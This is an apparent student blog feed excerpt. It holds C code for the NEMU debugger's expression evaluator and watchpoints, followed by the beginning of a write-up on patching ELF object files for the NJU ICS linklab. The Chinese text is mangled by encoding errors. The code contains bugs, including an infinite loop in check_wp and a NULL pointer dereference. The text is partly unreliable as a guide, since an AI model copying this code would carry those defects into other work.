class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‰¾å‡ºä¸»è¿ç®—ç¬¦</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">principal_operator</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> operator= <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> is_add_or_sub=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=start; i&lt;=end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">            bracket++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tokens[i].type==TK_BRAR)&#123;</span><br><span class="line">            bracket--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span>==bracket) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i].type == TK_ADD || tokens[i].type == TK_SUB) &#123;</span><br><span class="line">                operator=i;</span><br><span class="line">                is_add_or_sub=<span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">false</span> == is_add_or_sub &amp;&amp;</span><br><span class="line">                       (tokens[i].type == TK_DIV || tokens[i].type == TK_MUL||tokens[i].type ==TK_DEREF||tokens[i].type==TK_REG)) &#123;<span class="comment">//åº”è¯¥æŠŠä¼˜å…ˆçº§æœ€é«˜çš„æ”¾åé¢</span></span><br><span class="line">                operator=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> operator;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> answer_valid=<span class="literal">true</span>;</span><br><span class="line"><span class="comment">//é€’å½’æ±‚å€¼</span></span><br><span class="line"><span class="type">static</span> <span class="type">int32_t</span> <span class="title function_">eval</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (start == end) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tokens[start].type==TK_DEC)</span><br><span class="line">            <span class="keyword">return</span> atoi(tokens[start].str);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(tokens[start].type==TK_HEX)</span><br><span class="line">            <span class="keyword">return</span> strtol(tokens[start].str,<span class="literal">NULL</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tokens[start].type==TK_REG) &#123;</span><br><span class="line">           <span class="type">int</span> res= isa_reg_str2val(tokens[start].str,&amp;answer_valid);</span><br><span class="line">           <span class="keyword">if</span> (!answer_valid) &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">&quot;reg exp error&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">true</span> == check_parentheses(start, end)) &#123;</span><br><span class="line">        <span class="keyword">return</span> eval(start+<span class="number">1</span>,end<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (check_exp_is_valid(start,end)==<span class="literal">false</span>) &#123;<span class="comment">//check_parenthesesè¿”å›falseæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯æ²¡æœ‰è¢«æ‹¬å·åŒ…å›´ä½†è¡¨è¡¨è¾¾å¼æ­£ç¡®ï¼Œå¦ä¸€ç§æ˜¯è¡¨è¾¾å¼å°±ä¸å¯¹</span></span><br><span class="line">            answer_valid=<span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//è¿™é‡Œä¸ä¼šæœ‰å¤ªå¤šæ— æ„ä¹‰çš„æ€§èƒ½æ¶ˆè€—ï¼Œç¬¬ä¸€æ¬¡å°±ä¼šè¢«æ£€æµ‹å‡ºæ¥</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> operator=principal_operator(start, end);</span><br><span class="line">        <span class="keyword">if</span> (tokens[operator].type==TK_DEREF) &#123;</span><br><span class="line">            <span class="keyword">return</span> vaddr_read(strtoul(tokens[operator+<span class="number">1</span>].str,<span class="literal">NULL</span>,<span class="number">16</span>),<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int32_t</span> sum1=eval(start,operator<span class="number">-1</span>);</span><br><span class="line">        <span class="type">int32_t</span> sum2=eval(operator+<span class="number">1</span>,end);</span><br><span class="line">        <span class="keyword">switch</span> (tokens[operator].type) &#123;</span><br><span class="line">            <span class="keyword">case</span> TK_ADD:</span><br><span class="line">                <span class="keyword">return</span> sum1 + sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_SUB:</span><br><span class="line">                <span class="keyword">return</span> sum1 - sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_MUL:</span><br><span class="line">                <span class="keyword">return</span> sum1 * sum2;</span><br><span class="line">            <span class="keyword">case</span> TK_DIV:</span><br><span class="line">                <span class="keyword">return</span> sum1 / sum2;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int32_t</span> <span class="title function_">expr</span><span class="params">(<span class="type">char</span> *e, <span class="type">bool</span> *success)</span> &#123;</span><br><span class="line">    answer_valid=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!make_token(e)) &#123;</span><br><span class="line">        *success = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;=nr_token<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_MUL &amp;&amp;</span><br><span class="line">            (i == <span class="number">0</span> ||</span><br><span class="line">             (tokens[i - <span class="number">1</span>].type != TK_DEC || tokens[i - <span class="number">1</span>].type != TK_BRAL ||</span><br><span class="line">              tokens[i - <span class="number">1</span>].type != TK_HEX))) &#123;</span><br><span class="line">                tokens[i].type =TK_DEREF;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Insert codes to evaluate the expression. */</span></span><br><span class="line">    <span class="type">int32_t</span> answer=eval(<span class="number">0</span>,nr_token<span class="number">-1</span>);</span><br><span class="line">    *success=answer_valid;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_p</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">bool</span> flag=<span class="literal">true</span>;</span><br><span class="line">    <span class="type">int32_t</span> answer = expr(args, &amp;flag);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span>==flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error expression&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s: %d 0x%x\n&quot;</span>,args,answer,answer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç›‘è§†ç‚¹"><a href="#ç›‘è§†ç‚¹" class="headerlink" title="ç›‘è§†ç‚¹"></a>ç›‘è§†ç‚¹</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Add more members if necessary */</span></span><br><span class="line">  <span class="type">sword_t</span> value;</span><br><span class="line">  <span class="type">char</span> expr[<span class="number">32</span>];</span><br><span class="line">&#125; WP;</span><br><span class="line">WP* <span class="title function_">new_wp</span><span class="params">(<span class="type">int32_t</span> value,<span class="type">char</span> *expr)</span>; </span><br><span class="line"><span class="type">void</span> <span class="title function_">free_wp</span><span class="params">(WP *wp)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_wp</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dispaly_wp</span><span class="params">()</span>;</span><br><span class="line">WP* <span class="title function_">get_wp</span><span class="params">(<span class="type">char</span>* s)</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">init_wp_pool</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_WP; i ++) &#123;</span><br><span class="line">    wp_pool[i].NO = i;</span><br><span class="line">    wp_pool[i].next = &amp;wp_pool[i + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(wp_pool[i].expr, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  wp_pool[NR_WP - <span class="number">1</span>].next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  head = <span class="literal">NULL</span>;</span><br><span class="line">  free_ = wp_pool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Implement the functionality of watchpoint */</span></span><br><span class="line">WP* <span class="title function_">new_wp</span><span class="params">(<span class="type">int32_t</span> value,<span class="type">char</span> *expr)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==free_) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Dont hava free watch pointer&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    WP* temp = free_;</span><br><span class="line">    free_=free_-&gt;next;</span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    head = temp;</span><br><span class="line">    head-&gt;value=value;</span><br><span class="line">    <span class="built_in">memcpy</span>(head-&gt;expr,expr,<span class="built_in">strlen</span>(expr));</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">free_wp</span><span class="params">(WP* wp)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!wp) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;dont have this watch pointer&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (wp==head) &#123;</span><br><span class="line">        head =head-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      WP *temp=head;</span><br><span class="line">     <span class="keyword">while</span> (temp !=<span class="literal">NULL</span> &amp;&amp;temp-&gt;next!=wp) &#123;</span><br><span class="line">      temp=temp-&gt;next;</span><br><span class="line">     &#125;</span><br><span class="line">     temp-&gt;next=temp-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    wp-&gt;next=free_;</span><br><span class="line">    free_=wp;</span><br><span class="line">    wp-&gt;value = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(wp-&gt;expr, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">check_wp</span><span class="params">()</span> &#123;</span><br><span class="line">    WP* temp=head;</span><br><span class="line">    <span class="type">bool</span> equal=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (temp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="type">word_t</span> new_value=expr(temp-&gt;expr,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(new_value!=temp-&gt;value) &#123; </span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Num:%d  Expr:%s  at:%x\n&quot;</span>,temp-&gt;NO,temp-&gt;expr,temp-&gt;value);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;old value = 0x%x\nnew value = 0x%x\n&quot;</span>,temp-&gt;value,new_value);</span><br><span class="line">          equal = <span class="literal">false</span>;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> equal;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dispaly_wp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span>==head) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No watchpoints.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    WP* temp = head;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Num\tWhat\t&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (temp!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t0x%x\t\n&quot;</span>,temp-&gt;NO,temp-&gt;value);</span><br><span class="line">          temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">WP* <span class="title function_">get_wp</span><span class="params">(<span class="type">char</span>* s)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (wp_pool + atoi(s));  <span class="comment">// wp_poolä¸ºWP*ç±»å‹ï¼Œæ‰€ä»¥ä»–+n=(char *)wp_pool+sizeof(WP)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_w</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    WP* temp= new_wp(expr(args,&amp;flag),args);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">false</span> == flag) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error expression in watch&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;watch pointer at 0x%x\n&quot;</span>, temp-&gt;value);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;NOT ON DEBUG PATTERN&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cpu-exec.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">    asm_print(this_pc, seq_pc - this_pc, n &lt; MAX_INSTR_TO_PRINT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> check watchpoints here. */</span></span><br><span class="line">    <span class="keyword">if</span> (check_wp()) &#123;</span><br><span class="line">     nemu_state.state=NEMU_STOP; </span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="info-w"><a href="#info-w" class="headerlink" title="info w"></a>info w</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;r&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;w&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    dispaly_wp();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="d-NUM"><a href="#d-NUM" class="headerlink" title="d NUM"></a>d NUM</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_d</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  WP * temp=get_wp(args);</span><br><span class="line">  free_wp(temp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è°ƒè¯•å™¨æ‰€æœ‰command"><a href="#è°ƒè¯•å™¨æ‰€æœ‰command" class="headerlink" title="è°ƒè¯•å™¨æ‰€æœ‰command"></a>è°ƒè¯•å™¨æ‰€æœ‰command</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">char</span> *description;</span><br><span class="line">  <span class="type">int</span> (*handler)(<span class="type">char</span> *);</span><br><span class="line">&#125; cmd_table[] = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;help&quot;</span>, <span class="string">&quot;Display informations about all supported commands&quot;</span>, cmd_help&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;c&quot;</span>, <span class="string">&quot;Continue the execution of the program&quot;</span>, cmd_c&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;q&quot;</span>, <span class="string">&quot;Exit NEMU&quot;</span>, cmd_q&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;si&quot;</span>, <span class="string">&quot;Single Instruction&quot;</span>, cmd_si&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;info&quot;</span>, <span class="string">&quot;info reg or watch&quot;</span>, cmd_info&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;x&quot;</span>, <span class="string">&quot;show memcory info&quot;</span>, cmd_x&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;p&quot;</span>, <span class="string">&quot;pppp&quot;</span>, cmd_p&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;watch&quot;</span>, <span class="string">&quot;watch a point&quot;</span>, cmd_w&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;d&quot;</span>,<span class="string">&quot;delete a watch pointer&quot;</span>,cmd_d&#125;</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more commands */</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> NEMU </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJU ICS4 Linklab</title>
      <link href="/2023/05/08/ics4-linklab/"/>
      <url>/2023/05/08/ics4-linklab/</url>
      
        <content type="html"><![CDATA[<h1 id="NJU-ICS4-Linklab"><a href="#NJU-ICS4-Linklab" class="headerlink" title="NJU ICS4 Linklab"></a>NJU ICS4 Linklab</h1><p>moocä¸Šçš„å¥½åƒæ˜¯é˜‰å‰²ç‰ˆï¼Œä½œä¸ºä¸€ä¸ªè¢«pwnå™¶è¿‡è…°å­çš„ç”·äºº(bu shi)ï¼Œæ€ä¹ˆèƒ½æ”¾è¿‡è¿™ç§hackæ€§è´¨çš„labï¼Œå°±å»æ‰¾äº†è²Œä¼¼æ˜¯å®Œæ•´çš„lab:)</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1_tPhDGhKaF4HZ94oayqnMw">https://pan.baidu.com/s/1_tPhDGhKaF4HZ94oayqnMw</a><br>æå–ç ï¼šfbex</p><p>å®éªŒæ–‡ä»¶éƒ½æ˜¯x86-32çš„</p><p>é˜¶æ®µ 1ï¼šé™æ€æ•°æ®å¯¹è±¡ä¸ ELF æ•°æ®èŠ‚<br>é˜¶æ®µ 2ï¼šæŒ‡ä»¤ä¸ ELF ä»£ç èŠ‚<br>é˜¶æ®µ 3ï¼šç¬¦å·è§£æ<br>é˜¶æ®µ 4ï¼šswitch è¯­å¥ä¸é‡å®šä½<br>é˜¶æ®µ 5ï¼šå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶<br>é˜¶æ®µ 6ï¼šä½ç½®æ— å…³ä»£ç ï¼ˆPosition-Independent Codeï¼ŒPICï¼‰</p><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main) [<span class="number">1</span>]&gt; gcc -m32 -no-pie -o linkbomb main.o phase1.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">ddURHzFnm2mcxbehqVcVufpd68LdEePs        lYPCnZfPLLbMLzV3iM1A97QVLg7j8zcmDlD0clCtKV0kgLRshaBQ3kCaGG YMbr9ELE31xt2fau4zX7bEMCVf   qXOdnQ igVJcDsac1d9N7kSla5VLXAKDtjxAoNjW2tonwDzyASqLn5JKSf32EqapXP83B03NmDqUx</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; objdump -d phase1.o</span><br><span class="line"></span><br><span class="line">phase1.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span> &lt;do_phase&gt;:</span><br><span class="line">   <span class="number">0</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">   <span class="number">1</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">   <span class="number">3</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">   <span class="number">6</span>:   b8 <span class="number">9</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x9a</span>,%eax</span><br><span class="line">   b:   <span class="number">83</span> ec <span class="number">0</span>c                sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">   e:   <span class="number">50</span>                      push   %eax</span><br><span class="line">   f:   e8 fc ff ff ff          call   <span class="number">10</span> &lt;do_phase+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">14</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">17</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">18</span>:   c9                      leave</span><br><span class="line">  <span class="number">19</span>:   c3                      ret</span><br><span class="line">      </span><br><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase1.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x354</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00000301</span> R_386_32          <span class="number">00000000</span>   .data</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br></pre></td></tr></table></figure><p>.rel.textç»™textåšé‡å®šä½ï¼Œoffset 10å¤„ä¸ºputsï¼Œæ‰€ä»¥0x9aå¤„çš„æ•°æ®å‹æ ˆåšputså‚æ•°ï¼Œè¿™é‡ŒçŒœæµ‹å°±æ˜¯.dataçš„åç§»äº†</p><p><img src="/2023/05/08/ics4-linklab/image-20230506171613189.png" alt="image-20230506171613189"></p><p>ç›´æ¥æ”¹æ‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; gcc -m32 -no-pie -o linkbomb main.o phase1.o</span><br><span class="line">grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; ./linkbomb</span><br><span class="line">grxer</span><br></pre></td></tr></table></figure><h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000061</span> &lt;kfSvKnbh&gt;:</span><br><span class="line">  <span class="number">61</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">62</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">64</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">  <span class="number">67</span>:   <span class="number">83</span> ec <span class="number">08</span>                sub    $<span class="number">0x8</span>,%esp</span><br><span class="line">  <span class="number">6</span>a:   <span class="number">68</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x2</span></span><br><span class="line">  <span class="number">6f</span>:   ff <span class="number">75</span> <span class="number">08</span>                push   <span class="number">0x8</span>(%ebp)</span><br><span class="line">  <span class="number">72</span>:   e8 fc ff ff ff          call   <span class="number">73</span> &lt;kfSvKnbh+<span class="number">0x12</span>&gt;</span><br><span class="line">  <span class="number">77</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">7</span>a:   <span class="number">85</span> c0                   test   %eax,%eax</span><br><span class="line">  <span class="number">7</span>c:   <span class="number">75</span> <span class="number">10</span>                   jne    <span class="number">8</span>e &lt;kfSvKnbh+<span class="number">0x2d</span>&gt;</span><br><span class="line">  <span class="number">7</span>e:   <span class="number">83</span> ec <span class="number">0</span>c                sub    $<span class="number">0xc</span>,%esp</span><br><span class="line">  <span class="number">81</span>:   ff <span class="number">75</span> <span class="number">0</span>c                push   <span class="number">0xc</span>(%ebp)</span><br><span class="line">  <span class="number">84</span>:   e8 fc ff ff ff          call   <span class="number">85</span> &lt;kfSvKnbh+<span class="number">0x24</span>&gt;</span><br><span class="line">  <span class="number">89</span>:   <span class="number">83</span> c4 <span class="number">10</span>                add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">8</span>c:   eb <span class="number">01</span>                   jmp    <span class="number">8f</span> &lt;kfSvKnbh+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">8</span>e:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">8f</span>:   c9                      leave</span><br><span class="line">  <span class="number">90</span>:   c3                      ret</span><br><span class="line">  <span class="number">00000091</span> &lt;do_phase&gt;:</span><br><span class="line">  <span class="number">91</span>:   <span class="number">55</span>                      push   %ebp</span><br><span class="line">  <span class="number">92</span>:   <span class="number">89</span> e5                   mov    %esp,%ebp</span><br><span class="line">  <span class="number">94</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">95</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">96</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">97</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">98</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  ...ä¸€å †nop</span><br><span class="line">  d5:   <span class="number">5</span>d                      pop    %ebp</span><br><span class="line">  d6:   c3                      ret</span><br><span class="line"> grxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase1.ogrxer@ubuntu22-wsl ~/s/N/NJU-ICS-linklab (main)&gt; readelf -r phase2.o</span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x308</span> contains <span class="number">4</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000035</span>  <span class="number">00000</span>c02 R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strlen</span></span><br><span class="line"><span class="number">0000006b</span>  <span class="number">00000501</span> R_386_32          <span class="number">00000000</span>   .rodata</span><br><span class="line"><span class="number">00000073</span>  <span class="number">00000</span>d02 R_386_PC32        <span class="number">00000000</span>   <span class="built_in">strcmp</span></span><br><span class="line"><span class="number">00000085</span>  <span class="number">00000e02</span> R_386_PC32        <span class="number">00000000</span>   <span class="built_in">puts</span></span><br><span class="line"></span><br><span class="line">Relocation section <span class="string">&#x27;.rel.text&#x27;</span> at offset <span class="number">0x354</span> contains <span class="number">2</span> entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line"><span class="number">00000007</span>  <span class="number">00000301</span> R_386_32          <span class="number">00000000</span>   .data</span><br><span class="line"><span class="number">00000010</span>  <span class="number">00000e02</span> R_386_PC32        